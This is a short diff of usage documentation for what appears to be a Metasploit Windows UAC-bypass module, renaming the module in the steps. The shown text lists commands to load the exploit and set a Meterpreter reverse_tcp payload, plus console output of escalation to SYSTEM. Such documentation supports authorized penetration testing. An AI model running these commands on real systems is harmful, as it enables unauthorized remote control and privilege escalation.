@@ -17,7 +17,7 @@
 ## Usage
 	
   1. First we need to obtain a session on the target system.
-  2. Load module: `use exploit/windows/local/bypassuac_comhijack`
+  2. Load module: `use exploit/windows/local/bypassuac_sluihijack`
   3. Set the `payload`: `set payload windows/x64/meterpreter/reverse_tcp`
   4. Configure the `payload`.
 
@@ -134,6 +134,4 @@ meterpreter > getsystem
 meterpreter > getuid 
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >
-
-
 ```
